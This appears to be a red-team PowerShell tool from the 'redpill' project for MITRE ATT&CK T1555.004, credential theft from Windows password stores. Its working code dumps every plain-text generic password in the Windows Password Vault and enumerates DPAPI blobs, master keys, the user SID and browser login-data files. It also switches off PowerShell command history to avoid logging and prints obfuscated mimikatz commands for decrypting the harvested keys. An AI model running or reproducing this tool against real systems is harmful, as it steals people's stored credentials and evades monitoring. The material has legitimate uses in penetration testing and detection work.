<#
.SYNOPSIS
   Manage Windows Password Vault Items

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: VaultSvc
   Optional Dependencies: VaultCmd
   PS cmdlet Dev version: v1.1.8
   
.DESCRIPTION
   Manage Windows Password Vault Items

.NOTES
   This cmdlet only creates or dumps credentials with
   [Generic passwords] It will not decode DPAPI creds.
   Warning: Parameter 'resource' and 'username' are
   required to delete entrys from Password Vault.

.Parameter Action
   Check, Create, Dump, DPAPI, Delete (default: help) 

.Parameter Resource
   Resource or Url (default: https://www.siliconvalley/classified.portal)

.Parameter UserName
   Credential username (default: DOMAIN\USERNAME)

.Parameter Password
   Credential password (defaut: r00t3xp10it)

.Parameter Help
   Description of MITRE ATT&CK T1555.004

.EXAMPLE
   PS C:\> .\Invoke-VaultCmd.ps1 -action check
   Check for stored Resource_names with creds

.EXAMPLE
   PS C:\> .\Invoke-VaultCmd.ps1 -action create -resource "MyCredential" -username "SKYNET\pedro" -password "r00t3xp10it"
   Create new vault entry named 'MyCredential' with 'SKYNET\pedro' username and 'r00t3xp10it' as is access password

.EXAMPLE
   PS C:\> .\Invoke-VaultCmd.ps1 -action dump
   Dump ALL generic passwords [plain text] from vault

.EXAMPLE
   PS C:\> .\Invoke-VaultCmd.ps1 -action DPAPI
   Dump raw DPAPI master keys (un-decoded)

.EXAMPLE
   PS C:\> .\Invoke-VaultCmd.ps1 -action delete -resource "MyCredential" -username "BillGates"
   Delete resource 'MyCredential' with 'BillGates' username and comrrespondent creds from vault

.INPUTS
   None. You cannot pipe objects into Invoke-VaultCmd.ps1

.OUTPUTS
   [vault] Manage Windows Vault Entrys.
   [vault] Enumerating credential tokens

   Currently loaded vaults:
           Vault: Credenciais Web
           Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
           Location: C:\Users\pedro\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

           Vault: Credenciais do Windows
           Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
           Location: C:\Users\pedro\AppData\Local\Microsoft\Vault

   Secret Vault Name             Resource
   ------ ----------             --------
   DPAPI  Credenciais Web        https://Microsoft/land.com
   DPAPI  Credenciais Web        https://Silliconvalley/log.org
   DPAPI  Credenciais do Windows Domain:interactive=SKYNET\pedro
   DPAPI  Credenciais do Windows Domain:interactive=SKYNET\administrator

   UserName         Resource                      Password Type
   --------         --------                      -------------
   Domain\billGates https://Microsoft/land.com    Hidden::Generic
   SKYNET\pedro     http://Silliconvalley/log.org Hidden::Generic

.LINK
   https://github.com/r00t-3xp10it/redpill
   https://z3r0th.medium.com/abusing-dpapi-40b76d3ff5eb
   https://sites.utexas.edu/glenmark/2019/10/21/using-passwordvault-with-powershell
   https://www.insecurity.be/blog/2020/12/24/dpapi-in-depth-with-tooling-standalone-dpapi
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$Resource="https://www.siliconvalley/classified.portal",
   [string]$UserName="${Env:COMPUTERNAME}\${Env:USERNAME}",
   [string]$Password="r00t3xp10it",
   [string]$Action="help",
   [string]$Banner="true",
   [switch]$Help
)


Clear-Host
$StartBanner = @"

(                                                           
)\ )                           (                    (    )  
(()/(   )       (  (       (    )\ ) (   (    )   (  )\( /(  
/(_)| /( (  (  )\))(   (  )(  (()/( )\  )\( /(  ))\((_)\()) 
(_)) )(_)))\ )\((_)()\  )\(()\  ((_)|(_)((_)(_))/((_)_(_))/  
| _ ((_)_((_|(_)(()((_)((_)((_) _| |\ \ / ((_)_(_))(| | |_   
|  _/ _  (_-<_-< V  V / _ \ '_/ _  | \ V // _  | || | |  _|  
|_| \__,_/__/__/\_/\_/\___/_| \__,_|  \_/ \__,_|\_,_|_|\__| 
"@;
If($Banner -iMatch "true")
{
   write-host $StartBanner -ForegroundColor DarkRed
   write-host "    * GitHub: https://github.com/r00t-3xp10it/redpill *" -ForegroundColor DarkYellow
   Start-Sleep -Milliseconds 500
}


$Names = @()
$CmdletVersion = "v1.1.8"

## Build Output Table Object
$VaultEntrys = New-Object System.Data.DataTable
$VaultEntrys.Columns.Add("Secret")|Out-Null
$VaultEntrys.Columns.Add("Vault Name")|Out-Null
$VaultEntrys.Columns.Add("Resource")|Out-Null

$ErrorActionPreference = "SilentlyContinue"
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
write-host "`n[vault] Manage Windows Vault Entrys." -ForegroundColor Green
$host.UI.RawUI.WindowTitle = "@Invoke-VaultCmd $CmdletVersion {SSA@RedTeam}"

## Make sure mandatory parameter is correct set
If($Action -iNotMatch '^(Help|Check|Create|Dump|DPAPI|Delete)$')
{
   write-host "[vault] wrong -action '" -ForegroundColor Red -NoNewline
   write-host "$Action" -ForegroundColor DarkYellow -NoNewline
   write-host "' parameter input.`n" -ForegroundColor Red
   return
}

## Make sure service VaultSvc is running
If((Get-Service -Name "VaultSvc").Status -iNotMatch '^(Running)$')
{
   write-host "[vault] Cmdlet requires (" -ForegroundColor Red -NoNewline
   write-host "VaultSvc" -ForegroundColor DarkYellow -NoNewline
   write-host ") service running.`n" -ForegroundColor Red
   return
}


$Secret = @()
## Initializing the PasswordVault Object
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault

$Schemas = $(VaultCmd /list|findstr "Vault:") -replace '^\s*Vault: ',''
ForEach($Token in $Schemas)
{
   ## List credentials existence with VaultCmd builtin software
   $Names = (vaultcmd /listcreds:"$Token" /all|findstr "Resource") -replace 'Resource: ',''
   $Secret = (VaultCmd /listproperties:"$Token"|findstr "Current protection method:") -replace 'Current protection method: ',''

   ForEach($Item in $Names)
   {
      ## Add entrys found to Table
      $VaultEntrys.Rows.Add("$Secret","$Token","$Item")|Out-Null
   }
}


If($Action -iMatch '^(check)$')
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Scanning for credential tokens

   .OUTPUTS
      [vault] Manage Windows Vault Entrys.
      [vault] Enumerating credential tokens

      Currently loaded vaults:
              Vault: Credenciais Web
              Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
              Location: C:\Users\pedro\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

              Vault: Credenciais do Windows
              Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
              Location: C:\Users\pedro\AppData\Local\Microsoft\Vault

      Secret Vault Name             Resource
      ------ ----------             --------
      DPAPI  Credenciais Web        http://Silliconvalley/log.org
      DPAPI  Credenciais do Windows Domain:interactive=SKYNET\pedro
      DPAPI  Credenciais do Windows Domain:interactive=SKYNET\administrator

      UserName     Resource                      Password Type
      --------     --------                      -------------
      SKYNET\pedro http://Silliconvalley/log.org Hidden::Generic
   #>

   write-host "[vault] " -ForegroundColor Green -NoNewline
   write-host "Enumerating credential tokens`n"

   VaultCmd /list ## Currently loaded vaults
   ## Print OnScreen existing creds (DPAPI + GENERIC) inside passwordvault
   $VaultEntrys | Format-Table -AutoSize | Out-String -Stream | Select-Object -SkipLast 2

   Start-Sleep -Milliseconds 900
   ## Check if vault contains any Generic creds
   If(($vault.RetrieveAll()) -ne $null)
   {
      ## Use GUI ??? Or Format-Table outputs?
      # $vault.RetrieveAll() | Out-GridView -title "credentials dump"
      $vault.RetrieveAll() | Select-Object Username,Resource,@{Name='Password Type';Expression={"Hidden::Generic"}} |
         Out-String -Stream | Select-Object -SkipLast 1
   }
   Else
   {
      write-host "`n[vault] none valid credentials to decode found inside vault.`n" -ForegroundColor Red
   }
}


If($Action -iMatch '^(create)$')
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Create credential with Generic password

   .OUTPUTS
      [vault] Manage Windows Vault Entrys.
      [vault] Creating https://siliconvalley/Classified.portal credential

      UserName     Resource                                Password Type
      --------     --------                                -------------
      SKYNET\pedro https://siliconvalley/Classified.portal Hidden::Generic
   #>

   write-host "[vault] " -ForegroundColor Green -NoNewline
   write-host "Creating " -NoNewline
   write-host "$Resource" -ForegroundColor DarkYellow -NoNewline
   write-host " credential`n"

   ## Make sure mandatory param its set
   If([string]::IsNullOrEmpty($Resource))
   {
      write-host "[vault] Error: missing -resource parameter input.`n" -ForegroundColor Red
      return
   }

   ## Make sure 'Resource name' and 'Username' to create does NOT exist in vault 
   If([bool]($vault.RetrieveAll()|Where-Object{$_.Resource -eq "$Resource" -and $_.UserName -eq "$UserName"}) -Match "True")
   {
      ## Print OnScreen existing creds (DPAPI + GENERIC) inside passwordvault
      $VaultEntrys | Format-Table -AutoSize | Out-String -Stream | Select-Object -Skip 1 | Select-Object -SkipLast 1

      Start-Sleep -Milliseconds 1100
      ## Print OnScreen existing 'usernames' with 'resource' names associated.
      $vault.RetrieveAll() | Select-Object Username,Resource,@{Name='Password Type';Expression={"Hidden::Generic"}} |
         Out-String -Stream | Select-Object -Skip 1 | Select-Object -SkipLast 1

         write-host "[vault] Error: " -ForegroundColor Red -NoNewline
         write-host "$Resource" -ForegroundColor DarkYellow -NoNewline
         write-host " with username " -ForegroundColor Red -NoNewline
         write-host "$UserName" -ForegroundColor DarkYellow -NoNewline
         write-host " exists.`n" -ForegroundColor Red
         return          
   }

   ## Create unique credential ObjectAPI
   $cred = New-Object windows.Security.Credentials.PasswordCredential
   $cred.Resource = "$Resource"
   $cred.UserName = "$UserName"
   $cred.Password = "$Password"
   $vault.Add($cred)

   Start-Sleep -Milliseconds 800
   # ReView credential existance now
   If(($vault.RetrieveAll()) -ieq $null)
   {
      write-host "[vault] Error: fail to create: $Resource.`n" -ForegroundColor Red
   }
   Else
   {
      ## Print OnScreen just the recent created credential info
      $titanio = ($vault.RetrieveAll()).UserName|Where-Object{$_ -iMatch "$Username"}
      $vault.RetrieveAll() | Where-Object { $_.Resource -iMatch "^($REsource)$" -and $_.UserName -iMatch "$titanio"} |
         Select-Object -Property UserName,Resource,@{Name='Password Type';Expression={"Hidden::Generic"}} |
         Out-String -Stream | Select-Object -Skip 1 | Select-Object -SkipLast 1
   }

   ## Variable CleanUp
   Remove-Variable cred
}


If($Action -iMatch '^(dump)$')
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Dump plain text [Generic passwords] creds

   .NOTES
      This function dumps ALL generic passwords found

   .OUTPUTS
      Currently loaded vaults:
            Vault: Credenciais Web
            Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
            Location: C:\Users\pedro\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

            Vault: Credenciais do Windows
            Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
            Location: C:\Users\pedro\AppData\Local\Microsoft\Vault

    Secret Vault Name             Resource
    ------ ----------             --------
    DPAPI  Credenciais Web        https://siliconvalley/Classified.portal
    DPAPI  Credenciais do Windows Domain:interactive=SKYNET\pedro
    DPAPI  Credenciais do Windows Domain:interactive=SKYNET\administrator

    UserName     Resource                                Password
    --------     --------                                --------
    SKYNET\pedro https://siliconvalley/Classified.portal r00t3xp10it
   #>

   write-host "[vault] " -ForegroundColor Green -NoNewline
   write-host "Retrieving plain text credentials`n" 

   VaultCmd /list ## Currently loaded vaults
   ## Print OnScreen existing creds (DPAPI + GENERIC) inside passwordvault
   $VaultEntrys | Format-Table -AutoSize | Out-String -Stream | Select-Object -SkipLast 1

   Start-Sleep -Milliseconds 800
   ## Check if we have any credentials to display
   $CheckForCredentials = $vault.RetrieveAll()
   If([string]::IsNullOrEmpty($CheckForCredentials))
   {
      write-host "[Vault] none valid credentials to decode found inside vault.`n" -ForegroundColor Red
      return
   }

   ## Dump ALL valid credentials [Generic] in plain text 
   $vault.RetrieveAll() | % { $_.RetrievePassword(); $_ } |
      Select-Object -Property UserName,Resource,Password | Format-Table -AutoSize |
      Out-String -Stream | Select-Object -Skip 1 | Select-Object -SkipLast 1
}


If($Action -iMatch '^(delete)$')
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Delete Resource name from vault

   .NOTES
      Parameters 'resource' and 'username' are
      mandatory to successfull delete entrys..

   .OUTPUTS
      [vault] Deleting 'https://siliconvalley/Classified.portal' from vault.

      Currently loaded vaults:
            Vault: Credenciais Web
            Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
            Location: C:\Users\pedro\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

            Vault: Credenciais do Windows
            Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
            Location: C:\Users\pedro\AppData\Local\Microsoft\Vault

      Secret Vault Name             Resource
      ------ ----------             --------
      DPAPI  Credenciais Web        https://siliconvalley/Classified.portal
      DPAPI  Credenciais do Windows Domain:interactive=SKYNET\pedro
      DPAPI  Credenciais do Windows Domain:interactive=SKYNET\administrator

      UserName     Resource                                State
      --------     --------                                -----
      SKYNET\pedro https://siliconvalley/Classified.portal Deleted
   #>

   write-host "[vault] " -ForegroundColor Green -NoNewline
   write-host "Deleting '$Resource' from vault.`n"

   VaultCmd /list ## Currently loaded vaults
   ## Print OnScreen existing creds (DPAPI + GENERIC) inside passwordvault
   $VaultEntrys | Format-Table -AutoSize | Out-String -Stream | Select-Object -SkipLast 1

   ## Make sure 'Resource name' + 'Username' to delete exists in vault 
   If([bool]($vault.RetrieveAll()|Where-Object{$_.Resource -eq "$Resource" -and $_.UserName -eq "$UserName"}) -Match "False")
   {
      Start-Sleep -Milliseconds 800
      ## Print OnScreen existing 'usernames' with 'resource' names associated.
      $vault.RetrieveAll() | Select-Object Username,Resource,@{Name='Password Type';Expression={"Hidden::Generic"}} |
         Out-String -Stream | Select-Object -Skip 1 | Select-Object -SkipLast 1

      write-host "[vault] not found: " -ForegroundColor Red -NoNewline
      write-host "$Resource" -ForegroundColor DarkYellow -NoNewline
      write-host " with username " -ForegroundColor Red -NoNewline
      write-host "$UserName`n" -ForegroundColor DarkYellow
      return          
   }

   #Removing Unique Credential API
   $cred = New-Object Windows.Security.Credentials.PasswordCredential
   $cred.Resource = "$Resource"
   $cred.UserName = "$UserName"
   $vault.Remove($cred)

   Start-Sleep -Milliseconds 1200
   ## Make sure 'Resource name' and 'Username' to delete exists in vault 
   If([bool]($vault.RetrieveAll()|Where-Object{$_.Resource -eq "$Resource" -and $_.UserName -eq "$UserName"}) -Match "True")
   {
      write-host "[vault] fail to delete " -ForegroundColor Red -NoNewline
      write-host "$Resource`n" -ForegroundColor DarkYellow -NoNewline

      write-host "[vault] " -ForegroundColor Red -NoNewline
      write-host "review " -NoNewline
      write-host "$Username" -ForegroundColor DarkYellow -NoNewline
      write-host " and " -NoNewline
      write-host "$Resource" -ForegroundColor DarkYellow -NoNewline
      write-host " parameters.`n"
      return          
   }
   Else
   {
      $DeleteUserNam = $cred.UserName
      $Results = [PSCustomObject]@{
         UserName = "$DeleteUserNam"
         Resource = "$Resource"
         State = "deleted"
      }

      ## Colorize the output Table
      $Results | Out-String -Stream | Select-Object -Skip 1 |  Select-Object -SkipLast 1    
   }

   ## Variable CleanUp
   Remove-Variable cred
}


If($Action -iMatch '^(DPAPI)$')
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Dump DPAPI Master Keys \ Blobs

   .NOTES
      This function dumps DPAPI Master keys
      and blobs but it will NOT decode them.

   .OUTPUTS
      [vault] Manage Windows Vault Entrys.
      [vault] Dumping SKYNET DPAPI secrets.

      Currently loaded vaults:
              Vault: Credenciais Web
              Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
              Location: C:\Users\pedro\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

              Vault: Credenciais do Windows
              Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
              Location: C:\Users\pedro\AppData\Local\Microsoft\Vault

              DPAPI blob keys
              [PATH]::C:\Users\pedro\AppData\Roaming\Microsoft\Credentials
              [BLOB]::78D8FB08F793E5AD42292B24ED3E4964
              [BLOB]::D3DA1BB8B5BFC56D5A4B45A6742DA77B
              [PATH]::C:\Users\pedro\AppData\Local\Microsoft\Credentials
              [BLOB]::013F80D38C8D6E1BE9B8016C42A9BAF1
              [BLOB]::44FA1CD26A1DFBD511746C2C6A7ABE92

              DPAPI master keys
              [SID ]::S-1-5-21-303954997-3777458861-1701234188-1001
              [PATH]::C:\Users\pedro\AppData\Roaming\Microsoft\Protect
              [GUID]::026e9df0-72c9-47dd-821f-dc8b80fc267c
              [GUID]::2857da38-7963-4dbf-96aa-f1dda01007a7
              [GUID]::56418735-f341-4f75-ba7d-66848676181b
              [GUID]::5f0c5a8c-ba6b-44ef-9913-6b38cb146eef

              WebBrowser Credential files
              $MEdge::C:\Users\pedro\AppData\Local\Microsoft\Edge\User Data

      [mimi`katz] dpapi::cred /in:"C:\Users\pedro\AppData\Local\Microsoft\Credentials\<CREDENTIAL_BLOB>"
      [mi`mikatz] dpapi::masterkey /in:"C:\Users\pedro\AppData\Roaming\Microsoft\Protect\<SID>\<MASTER_KEY_GUID>" /rpc
      [ vault: ] 19:00:57 - module finished dumping secrets ..
   #>

   $i = 0
   write-host "[vault] " -ForegroundColor Green -NoNewline
   write-host "Dumping $Env:USERDOMAIN DPAPI secrets.`n"
   VaultCmd /list ## Currently loaded vaults


   $f = 0
   Start-Sleep -Milliseconds 800
   ## Dump DPAPI Blobs function
   $Location = "$Env:USERPROFILE\AppData\Roaming\Microsoft\Protect"                                                              ## MASTERKEYS
   $Dpapi1 = (Get-ChildItem -Path "$Env:APPDATA\Microsoft\Credentials" -Attributes Hidden -Force -EA SilentlyContinue).Name      ## BLOB
   $Dpapi2 = (Get-ChildItem -Path "$Env:LOCALAPPDATA\Microsoft\Credentials" -Attributes Hidden -Force -EA SilentlyContinue).Name ## BLOB
   If($Dpapi1 -ne $null -or $Dpapi2 -ne $null)
   {
      write-host "`n        DPAPI blob keys" -ForegroundColor Green
      write-host "        [" -NoNewline
      write-host "PATH" -ForegroundColor Green -NoNewline
      write-host "]::" -NoNewline
      write-host "$Env:APPDATA\Microsoft\Credentials" -ForegroundColor DarkGray
      $line1 = $Dpapi1[0];$key1 = "        [BLOB]::"+"$line1" -join ''
      $line2 = $Dpapi1[1];$key2 = "        [BLOB]::"+"$line2" -join ''
      $line3 = $Dpapi1[2];$key3 = "        [BLOB]::"+"$line3" -join ''
      $line4 = $Dpapi1[3];$key4 = "        [BLOB]::"+"$line4" -join ''
      If($line1){echo $key1};If($line2){echo $key2};
      If($line3){echo $key3};If($line4){echo $key4};

      ## LOCALAPPDATA dpapi keys
      write-host "        [" -NoNewline
      write-host "PATH" -ForegroundColor Green -NoNewline
      write-host "]::" -NoNewline
      write-host "$Env:LOCALAPPDATA\Microsoft\Credentials" -ForegroundColor DarkGray
      $line5 = $Dpapi2[0];$key5 = "        [BLOB]::"+"$line5" -join ''
      $line6 = $Dpapi2[1];$key6 = "        [BLOB]::"+"$line6" -join ''
      $line7 = $Dpapi2[2];$key7 = "        [BLOB]::"+"$line7" -join ''
      $line8 = $Dpapi2[3];$key8 = "        [BLOB]::"+"$line8" -join ''
      $line9 = $Dpapi2[4];$key9 = "        [BLOB]::"+"$line9" -join ''
      If($line5){echo $key5};If($line6){echo $key6};
      If($line7){echo $key7};If($line8){echo $key8};
      If($line9){echo $key9};
      $f = $f + 1
   }
   Else
   {
      write-host "        [" -NoNewline
      write-host "vault" -ForegroundColor Red -NoNewline
      write-host "]:" -NoNewline
      write-host "none DPAPI blobs found on ${Env:USERDOMAIN}?" -ForegroundColor Red
   }


   ## Dumping Master Keys
   If($f -gt 0){write-host ""}
   Start-Sleep -Milliseconds 700
   $MasterKeySSID = (Get-ChildItem -Path "$Location").FullName
   If([string]::IsNullOrEmpty($MasterKeySSID))
   {
      write-host "        [" -NoNewline
      write-host "vault" -ForegroundColor Red -NoNewline
      write-host "]:" -NoNewline
      write-host "none DPAPI master keys found on ${Env:USERDOMAIN}?" -ForegroundColor Red     
   }
   Else
   {
      write-host "`n        DPAPI master keys" -ForegroundColor Green
      $UserName_SSID = $MasterKeySSID.Split('\\')[-1]
      If([string]::IsNullOrEmpty($UserName_SSID))
      {
         write-host "        [" -NoNewline
         write-host "SID " -ForegroundColor Red -NoNewline
         write-host "]::" -NoNewline
         write-host "fail to find user SID identification." -ForegroundColor Red
      }
      Else
      {
         write-host "        [" -NoNewline
         write-host "SID " -ForegroundColor Green -NoNewline
         write-host "]::" -NoNewline
         write-host "$UserName_SSID" -ForegroundColor Red
      }

      write-host "        [" -NoNewline
      write-host "PATH" -ForegroundColor Green -NoNewline
      write-host "]::" -NoNewline
      write-host "$Location" -ForegroundColor DarkGray

      ## Search for any master keys inside SID folder
      $GUID = (Gci -Path "$MasterKeySSID" -Attributes Hidden -Force -EA SilentlyContinue|?{$_.Name -NotMatch '(^Preferred|.ini$|^~)'}).Name
      If(-not([string]::IsNullOrEmpty($GUID)))
      {
         $i = $i + 1 ## GUID found
         ForEach($AuthToken in $GUID)
         {
            write-host "        [" -NoNewline
            write-host "GUID" -ForegroundColor Green -NoNewline
            write-host "]::" -NoNewline
            write-host "$AuthToken"
         }
      }
      Else
      {
            write-host "        [" -NoNewline
            write-host "GUID" -ForegroundColor Red -NoNewline
            write-host "]::" -NoNewline
            write-host "none GUID files found on ${Env:USERDOMAIN} machine?" -ForegroundColor Red
      }
   }


   $r = 0
   Start-Sleep -Milliseconds 700
   ## browser creds - Web Credentials
   write-host "`n`n        WebBrowser Credential files" -ForegroundColor Green
   If(Test-Path -Path "$Env:LOCALAPPDATA\Microsoft\Edge\User Data")
   {
      $r = $r + 1
      write-host "        `$MEdge" -ForegroundColor Green -NoNewline  
      write-host "::$Env:LOCALAPPDATA\Microsoft\Edge\User Data"    
   }
   If(Test-Path -Path "$Env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data")
   {
      $r = $r + 1
      write-host "        Chrome" -ForegroundColor Green -NoNewline 
      write-host "::$Env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
   }
   $OperaName = (Get-ChildItem -Path "$Env:APPDATA\Opera Software").FullName
   If(Test-Path -Path "$OperaName\Login Data")
   {
      $r = $r + 1
      write-host "        `$Opera" -ForegroundColor Green -NoNewline 
      write-host "::$OperaName\Login Data"       
   }
   If(Test-Path -Path "$Env:APPDATA\Mozilla\Firefox\Profiles\*.default\logins.json")
   {
      $r = $r + 1
      write-host "        Firefox" -ForegroundColor Green -NoNewline 
      write-host ":$Env:APPDATA\Mozilla\Firefox\Profiles\*.default\logins.json"      
   }
   If(Test-Path -Path "$Env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json")
   {
      $r = $r + 1
      write-host "        Firefox" -ForegroundColor Green -NoNewline 
      write-host ":$Env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json"       
   }
   If(Test-Path -Path "$Env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data")
   {
      $r = $r + 1
      write-host "        `$Brave" -ForegroundColor Green -NoNewline 
      write-host "::$Env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
   }


   If($r -lt 1)
   {
      write-host "        [" -NoNewline
      write-host "vault" -ForegroundColor Red -NoNewline
      write-host "]:" -NoNewline
      write-host "none Credential files found on ${Env:USERDOMAIN}?" -ForegroundColor Red        
   }

   If($i -gt 0 -or $f -gt 0)
   {
      $Success = "true"
      write-host "`n[mimi`katz] dpapi::cred /in:`"$Env:LOCALAPPDATA\Microsoft\Credentials\<CREDENTIAL_BLOB>`"" -ForegroundColor Red
      write-host "[mim`ikat`z] dpapi::masterkey /in:`"$Env:USERPROFILE\AppData\Roaming\Microsoft\Protect\<SID>\<MASTER_KEY_GUID>`" /rpc" -ForegroundColor Red
   }

   $FinalTime = Get-Date -Format "HH:mm:ss"
   If($Success -ne "true")
   {
      write-host "`n[ vault: ] " -ForegroundColor Green -NoNewLine
   }
   Else
   {
      write-host "[ vault: ] " -ForegroundColor Green -NoNewLine   
   }
   write-host "$FinalTime" -ForegroundColor DarkGray -NoNewLine
   write-host " - module finished dumping secrets ..`n"

}


If($Help.IsPresent -or $Action -iMatch "^(help)$")
{

<#
.SYNOPSIS
   Author: @r00t-3xp10it
   Helper - MITRE ATT&CK T1555.004 description
#>

write-host "`n  MITRE ATT&CK T1555.004" -ForegroundColor Green
write-host "  Dumping credentials from Password Stores" -ForegroundColor DarkGreen

$DetailHelp = @"
  The Credential Manager stores credentials for signing into websites, applications and
  or devices that request authentication through NTLM or Kerberos in Credential Lockers.

  The Windows Credential Manager separates website credentials from application or network
  credentials in two lockers. Credentials from Web Browsers, Internet Explorer and Microsoft
  Edge websites are managed by the Credential Manager and are stored in the Web Credentials
  locker, Application and network credentials are stored in the Windows Credentials locker.

  Adversaries may list credentials managed by the Windows Credential Manager through several
  mechanisms. The vaultcmd.exe is a native Windows executable that can be abused to enumerate,
  create or delete credentials stored in the Credential Locker through a command-line interface.

"@
write-host $DetailHelp -ForegroundColor DarkGray
write-host "  CMDLET EXECUTION EXAMPLES" -ForegroundColor DarkGreen
write-host "  Get-Help .\Invoke-VaultCmd.ps1 -examples" -ForegroundColor DarkGray

write-host "`n  PROJECT COMTRIBUTIONS" -ForegroundColor DarkGreen
write-host "  @ShantyDamayanti" -ForegroundColor DarkGray
write-host "  @D1rkMtr`n" -ForegroundColor DarkGray
exit
}